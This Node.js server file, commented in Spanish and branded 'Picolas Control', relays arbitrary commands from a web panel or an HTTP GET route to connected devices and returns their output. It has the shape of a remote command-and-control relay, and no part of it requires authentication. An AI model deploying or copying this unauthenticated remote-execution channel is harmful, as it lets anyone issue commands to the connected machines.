const express = require("express");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(__dirname + "/panel"));

let devices = {};

// ==============================
// SOCKET CONNECTION
// ==============================

io.on("connection", (socket) => {

    const device = socket.handshake.auth?.device;

    if (device) {

        devices[device] = socket.id;

        console.log("📱 Dispositivo conectado:", device);

        // avisar al panel que hay dispositivos
        io.emit("devices-update", Object.keys(devices));

    } else {

        console.log("🌐 Cliente conectado (panel)");

    }

    // ==============================
    // RESULTADO DE COMANDO
    // ==============================

    socket.on("result", (data) => {

        console.log("📥 Resultado de", data.device);

        io.emit("terminal-output", data);

    });

    // ==============================
    // EJECUTAR COMANDO DESDE PANEL
    // ==============================

    socket.on("execute", (data) => {

        const { device, cmd } = data;

        const socketId = devices[device];

        if (!socketId) {

            console.log("⚠️ Dispositivo offline:", device);

            return;

        }

        console.log("⚡ Ejecutando en", device, ":", cmd);

        io.to(socketId).emit("command", cmd);

    });

    // ==============================
    // DISCONNECT
    // ==============================

    socket.on("disconnect", () => {

        for (let d in devices) {

            if (devices[d] === socket.id) {

                console.log("❌ Dispositivo desconectado:", d);

                delete devices[d];

                io.emit("devices-update", Object.keys(devices));

            }

        }

    });

});

// ==============================
// API: LISTA DISPOSITIVOS
// ==============================

app.get("/devices", (req, res) => {

    res.json(Object.keys(devices));

});

// ==============================
// API: EJECUTAR COMANDO (HTTP)
// ==============================

app.get("/exec/:device/:cmd", (req, res) => {

    const { device, cmd } = req.params;

    const socketId = devices[device];

    if (!socketId) {

        return res.send("dispositivo offline");

    }

    console.log("⚡ HTTP EXEC:", device, cmd);

    io.to(socketId).emit("command", cmd);

    res.send("comando enviado");

});

// ==============================
// SERVER START
// ==============================

server.listen(3000, () => {

    console.log("");
    console.log("⚡ Picolas Control iniciado");
    console.log("🌐 http://localhost:3000");
    console.log("");

});